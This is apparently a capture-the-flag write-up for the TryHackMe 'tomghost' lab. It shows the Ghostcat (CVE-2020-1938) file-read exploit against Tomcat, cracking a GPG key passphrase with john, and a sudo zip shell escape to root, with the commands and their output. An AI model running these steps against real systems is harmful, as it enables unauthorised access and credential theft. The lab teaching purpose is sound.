# what I learn
- ghostcat
- gpg cracking
- gtfobin zip

# enumerating
- 22/tcp   open  ssh
- 53/tcp   open  domain
- 8009/tcp open  ajp13
- 8080/tcp open  http-proxy
  - tomcat 9.0.30

# foothold
aftersome diging, tomcat version 9.0.30 is vulnerable to Ghostcat attack or CVE-2020-1938. 
```
This vulnerability report identified a mechanism that allowed: - returning arbitrary files from anywhere in the web application - processing any file in the web application as a JSP Further, if the web application allowed file upload and stored those files within the web application (or the attacker was able to control the content of the web application by some other means) then this, along with the ability to process a file as a JSP, made remote code execution possible
```
I found a exploit scrip call [ajpShooter.py](https://github.com/00theway/Ghostcat-CNVD-2020-10487).
```console
kali@kali:~/THM/tomghost$ python3 ajpShooter.py <tomcat ip:port> <ajp port> /WEB-INF/web.xml read 
```
you should recive a credential here
```html
<description>
     Welcome to GhostCat
        skyfuck:Password
</description>
```
in `skyfuck` home directory we foud 2 files.
```console
skyfuck@ubuntu:~$ file *
credential.pgp: data
tryhackme.asc:  ASCII text, with CRLF line terminators
```
1. credential.pgp : containt encrypted data/credential
2. tryhackme.asc: private block key

but where is our user flag?
```console
skyfuck@ubuntu:~$ find / -name user.txt 2> /dev/null
/home/merlin/user.txt
```
damn we dont have permission to open it but... we can use what we found to gain access as merlin


we can use john to crack `tryhackme.asc` and get the password then use the password to decrypt `credential.pgp`. let copy the prive block key to our kali and crack it using `john`.
```console
kali@kali:~/THM/tomghost$ scp skyfuck@10.10.187.16:/home/skyfuck/tryhackme.asc . # copy using scp
skyfuck@10.10.187.16's password: 
```
`tryhackme.asc` is a private gpg key which john cannot handle it direckly, we need to convert the private key to a hash using `gpg2john`. thereafter we can use john to crack the hash. So let do it
```console
kali@kali:~/THM/tomghost$ find / -name gpg2john 2> /dev/null
/usr/sbin/gpg2john
root@kali:~# gpg2john /home/kali/THM/tomghost/tryhackme.asc /home/kali/THM/tomghost/key.txt # convert gpg key to hash for john
root@kali:~# john /home/kali/THM/tomghost/key.txt -wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password        (tryhackme)
1g 0:00:00:00 DONE (2020-07-23 07:21) 10.00g/s 10720p/s 10720c/s 10720C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
now we know the password to the key, we can then import the key into our key ring. then use it to decrypt `credential.pgp`.
```console
kali@kali:~/THM/tomghost$ gpg --import tryhackme.asc 
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
kali@kali:~/THM/tomghost$ scp skyfuck@10.10.187.16:/home/skyfuck/credential.pgp . # copy it
skyfuck@10.10.187.16's password: 
credential.pgp                                                    100%  394     7.9KB/s   00:00   
kali@kali:~/THM/tomghost$ gpg --decrypt credential.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:password
```
# root
```console
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
```
no word here, just check https://gtfobins.github.io/gtfobins/zip/
# ref
- [CVE-2020-1938](https://cve.circl.lu/cve/CVE-2020-1938)
- [gifobins/zip](https://gtfobins.github.io/gtfobins/zip/)
- [ajpShooter.py](https://github.com/00theway/Ghostcat-CNVD-2020-10487)


